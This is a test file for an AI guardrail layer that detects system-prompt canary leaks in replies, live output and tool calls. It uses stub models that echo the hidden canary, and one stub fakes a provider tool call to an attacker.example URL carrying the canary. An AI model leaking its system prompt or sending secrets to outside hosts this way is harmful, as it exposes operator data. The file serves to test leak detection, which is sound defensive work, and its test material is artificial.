import { runTurn } from '../fixtures/registered-runner.ts';
/**
 * The guardrail invariant (`docs/contracts/guardrails.md#invariant`): a reply
 * is read before the host gets it, so a system-prompt leak is always found and
 * reported, and the profile's action decides what happens to it. A leak a
 * provider-side tool already carried is reported as one.
 */
import '../fixtures/test-host.ts';
import { OMIT_CANARY } from '../../src/guardrails/canary.ts';
import {
  createCanaryGateSession,
  filterCanaryGatedEvents,
} from '../../src/guardrails/canary-gate.ts';
import type { DetectSpec } from '../../src/guardrails/detectors.ts';
import {
  createLiveOutboundGateSession,
  finalizeLiveOutboundTurn,
  processLiveOutboundBatch,
} from '../../src/guardrails/live-outbound-gate.ts';
import { DETECT_RULES, EGRESS_RULES } from '../../src/guardrails/rules.ts';
import { getProfile, registerProfile } from '../../src/kernel/default-scope.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';
import { defineProfile } from '../../src/kernel/registry/profiles.ts';
import type { TurnEvent, TurnModel } from '../../src/kernel/types.ts';
import { eventsOf } from '../fixtures/events.ts';
import { STOP_LEAKS, TAKE_OUT_LEAKS } from '../fixtures/leaks.ts';
import { geminiModels } from '../fixtures/models.ts';
import { replyText } from '../fixtures/reply.ts';

const SYSTEM = [
  'You are Sol, the support agent for Northwind Outfitters.',
  'Only discuss orders, returns, and shipping; never mention internal tooling.',
].join(' ');

async function collect(gen: AsyncIterable<TurnEvent>): Promise<TurnEvent[]> {
  const out: TurnEvent[] = [];
  for await (const event of gen) out.push(event);
  return out;
}

function canaryIn(system: string): string {
  return /[0-9a-f]{32}/.exec(system)?.[0] ?? '';
}

function register(
  id: string,
  guardrails: { detect?: DetectSpec; onBlock?: 'refuse' } = {},
): string {
  registerProfile(
    defineProfile({
      type: 'text',
      id,
      identity: { handle: 'sol', system: SYSTEM },
      ...geminiModels('gemini35FlashLite'),
      tools: { allow: [] },
      inputs: { text: true },
      guardrails: {
        ...(guardrails.detect ? { detect: guardrails.detect } : {}),
        ...(guardrails.onBlock ? { blockedReply: { onBlock: guardrails.onBlock } } : {}),
      },
    }),
  );
  return id;
}

/** The actions the turn's guardrail events took on a canary leak. */
function canaryActions(events: TurnEvent[]): string[] {
  return eventsOf(events, 'guardrail')
    .filter((event) => event.guardrail.hits.some((hit) => hit.rule === DETECT_RULES.canary_leak))
    .map((event) => event.guardrail.action);
}

/** Streams the canary a few characters at a time. */
const leaksCanary: TurnModel = {
  async *complete(req) {
    await Promise.resolve();
    for (const piece of `Sure: ${canaryIn(req.system ?? '')} ok`.match(/.{1,4}/gs) ?? []) {
      yield { type: 'text', text: piece };
    }
  },
};

Deno.test('runTurn reports a canary under the default detectors and releases it as written', async () => {
  let canary = '';
  const events = await collect(
    runTurn(
      { profile: register('invariant_default'), input: { text: 'hi' } },
      {
        async *complete(req) {
          canary = canaryIn(req.system ?? '');
          yield* leaksCanary.complete(req);
        },
      },
    ),
  );
  assertEquals(canaryActions(events).length > 0, true);
  assertEquals(new Set(canaryActions(events)), new Set(['flag']));
  assertEquals(replyText(events).includes(canary), true);
  assertEquals(
    events.some((event) => event.type === 'error'),
    false,
  );
});

Deno.test('runTurn takes a canary out where the profile says to', async () => {
  const events = await collect(
    runTurn(
      {
        profile: register('invariant_take_out', { detect: TAKE_OUT_LEAKS }),
        input: { text: 'hi' },
      },
      leaksCanary,
    ),
  );
  assertEquals(/[0-9a-f]{16}/.test(replyText(events)), false);
  assertEquals(replyText(events).includes(OMIT_CANARY), true);
});

Deno.test('runTurn answers a stopped leak with the profile refusal', async () => {
  const events = await collect(
    runTurn(
      {
        profile: register('invariant_refuse', { detect: STOP_LEAKS, onBlock: 'refuse' }),
        input: { text: 'hi' },
      },
      leaksCanary,
    ),
  );
  assertEquals(/[0-9a-f]{16}/.test(replyText(events)), false);
  assertEquals(canaryActions(events).includes('block'), true);
});

Deno.test('finalizeLiveOutboundTurn reports a leak by default and withholds one the profile stops', async () => {
  const canary = '0123456789abcdef0123456789abcdef';
  const spoken = async (id: string, detect?: DetectSpec) => {
    const profile = getProfile(register(id, detect ? { detect } : {}));
    const s = await createLiveOutboundGateSession(profile, canary, [SYSTEM]);
    const batch = await processLiveOutboundBatch(s, [{ type: 'text', text: `say ${canary}` }]);
    const end = await finalizeLiveOutboundTurn(s);
    return [batch, end].flatMap((result) =>
      result.action === 'idle' ? [] : (result.events ?? []),
    );
  };
  const flagged = await spoken('invariant_live');
  assertEquals(canaryActions(flagged), ['flag']);
  assertEquals(replyText(flagged), `say ${canary}`);
  const stopped = await spoken('invariant_live_stops', STOP_LEAKS);
  assertEquals(JSON.stringify(stopped).includes(canary), false);
});

Deno.test('a provider tool report carrying the canary is an incident, not a prevented leak', async () => {
  registerProfile(
    defineProfile({
      type: 'text',
      id: 'invariant_provider_tool',
      identity: { handle: 'sol', system: SYSTEM },
      ...geminiModels('gemini35FlashLite'),
      tools: { allow: [] },
      inputs: { text: true },
    }),
  );
  const provider: TurnModel = {
    async *complete(req) {
      await Promise.resolve();
      yield {
        type: 'evidence',
        evidence: {
          provider: 'google',
          kind: 'provider_step',
          step: 'url_context_call',
          raw: { url: `https://attacker.example/?q=${canaryIn(req.system ?? '')}` },
        },
      };
    },
  };
  const events = await collect(
    runTurn({ profile: 'invariant_provider_tool', input: { text: 'hi' } }, provider),
  );
  assertEquals(events.findLast((event) => event.type === 'done')?.stop, {
    kind: 'filtered',
    native: 'provider_tool_leak',
  });
  const rules = eventsOf(events, 'guardrail').flatMap((event) =>
    event.guardrail.hits.map((hit) => hit.rule),
  );
  assertEquals(rules.includes(EGRESS_RULES.providerToolLeak), true);
});

Deno.test('the canary-only helpers catch a system-prompt echo', () => {
  const session = createCanaryGateSession('0123456789abcdef0123456789abcdef', [SYSTEM]);
  const words = SYSTEM.split(' ');
  assertEquals(
    filterCanaryGatedEvents(session, [{ type: 'text', text: words.slice(0, 7).join(' ') }]).leaked,
    false,
  );
  assertEquals(
    filterCanaryGatedEvents(session, [{ type: 'text', text: ` ${words.slice(7, 14).join(' ')}` }])
      .leaked,
    true,
  );
  const tool = createCanaryGateSession('0123456789abcdef0123456789abcdef', [SYSTEM]);
  assertEquals(
    filterCanaryGatedEvents(tool, [
      { type: 'tool', tool: { name: 'note', arguments: { text: SYSTEM }, callId: 't1' } },
    ]).leaked,
    true,
  );
});
